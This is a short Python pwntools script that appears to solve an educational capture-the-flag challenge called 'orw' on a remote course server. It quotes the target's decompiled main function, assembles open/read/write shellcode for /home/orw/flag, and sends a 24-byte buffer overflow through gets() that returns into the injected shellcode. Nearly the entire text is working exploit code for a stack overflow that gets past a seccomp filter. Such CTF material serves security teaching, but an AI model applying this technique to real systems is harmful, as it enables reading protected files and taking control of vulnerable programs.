import binascii
from pwn import *

context.arch = 'amd64'

# p = process('./orw')
p = remote('edu-ctf.csie.org', 10171)

'''
undefined8 main(EVP_PKEY_CTX *param_1)

{
  char local_18 [16];

  init(param_1);
  seccomp();
  puts("Give me your shellcode>");
  read(0,sc,0x100);
  puts("I give you bof, you know what to do :)");
  gets(local_18);
  return 0;
}
'''

sc = asm(
    shellcraft.pushstr('/home/orw/flag') +
    shellcraft.open('rsp', 0, 0) +
    shellcraft.read('rax', 'rsp', 50) +
    shellcraft.write(1, 'rsp', 50))

print(sc)
# sc -> 0x6010a0
ret = p64(0x6010a0)

p.sendlineafter('>', sc)
p.sendlineafter(':)', b'A' * 24 + ret)

p.interactive()
